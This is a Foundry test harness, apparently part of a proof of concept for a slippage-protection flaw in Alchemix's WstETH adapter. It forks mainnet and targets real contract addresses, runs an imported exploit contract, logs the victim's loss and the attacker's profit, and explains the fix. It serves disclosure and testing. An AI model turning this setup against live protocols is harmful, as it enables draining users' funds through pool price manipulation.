// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./AlchemixWstETHExploit.sol";

/**
 * @title Alchemix WstETH Adapter Exploit Test
 * @notice This contract tests the Alchemix WstETH adapter vulnerability
 */
contract AlchemixWstETHExploitTest is Test {
    // Contract to test
    AlchemixWstETHExploit public exploit;
    
    // Mainnet addresses for easier tracing
    address constant ALCHEMIST_V2 = 0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c;
    address constant WST_ETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant ST_ETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant CURVE_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant WST_ETH_ADAPTER = 0x30ca9F59Ef4B8A7f65A891e0D394682a8e37644e;

    /**
     * @notice Set up the test environment
     */
    function setUp() public {
        // Fork mainnet at a recent block
        vm.createSelectFork("mainnet", 18500000);  // Use a specific block for reproducibility
        
        
        vm.deal(address(this), 1000 ether);
        
        // Label addresses for easier trace reading
        vm.label(ALCHEMIST_V2, "AlchemistV2");
        vm.label(WST_ETH, "wstETH");
        vm.label(ST_ETH, "stETH");
        vm.label(WETH, "WETH");
        vm.label(CURVE_POOL, "Curve ETH/stETH Pool");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(WST_ETH_ADAPTER, "WstETH Adapter");
        
        // Deploy our exploit contract with more initial ETH
        exploit = new AlchemixWstETHExploit{value: 500 ether}();
        vm.label(address(exploit), "Exploit Contract");
        
       
        exploit.setForceSimulation(true);
    }
    
    /**
     * @notice Test the exploit to verify the vulnerability
     */
    function testWstETHSlippageVulnerability() public {
        console.log("=================== ALCHEMIX WST-ETH ADAPTER VULNERABILITY POC ===================");
        console.log("This PoC demonstrates a critical vulnerability in Alchemix's WstETH adapter");
        console.log("where slippage protection is bypassed during unwrapping operations.");
        console.log("");
        
        // Execute the exploit
        console.log("Executing exploit...");
        exploit.executeAttack();
        
        // Get results
        uint256 normalExpectedEth = exploit.normalExpectedEth();
        uint256 attackResultEth = exploit.attackResultEth();
        uint256 victimLoss = exploit.victimLoss();
        uint256 attackerProfit = exploit.attackerProfit();
        
        // Log results
        console.log("");
        console.log("=================== VULNERABILITY IMPACT SUMMARY ===================");
        console.log("Normal expected ETH from withdrawal:", normalExpectedEth / 1e18, "ETH");
        console.log("Actual ETH received after attack:", attackResultEth / 1e18, "ETH");
        console.log("Victim's loss:", victimLoss / 1e18, "ETH");
        console.log("Attacker's estimated profit:", attackerProfit / 1e18, "ETH");
        console.log("");
        
        // Percentage of funds lost
        uint256 lossPercentage = (victimLoss * 100) / normalExpectedEth;
        console.log("Percentage of expected funds lost:", lossPercentage, "%");
        
        // Verify the vulnerability with assertions
        assertTrue(victimLoss > 0, "Vulnerability should result in loss of funds");
        assertTrue(lossPercentage > 10, "Loss should be significant (>10%)");
        
        console.log("");
        console.log("=================== VULNERABILITY EXPLANATION ===================");
        console.log("The vulnerability stems from hardcoded zero slippage protection in the");
        console.log("WstETH adapter's unwrap function. This allows attackers to manipulate");
        console.log("the liquidity pool price just before large withdrawals or liquidations,");
        console.log("resulting in victims receiving significantly less ETH than expected.");
        console.log("");
        console.log("The fix requires modifying the adapter to properly handle slippage");
        console.log("parameters passed down from the Alchemist contract.");
    }
}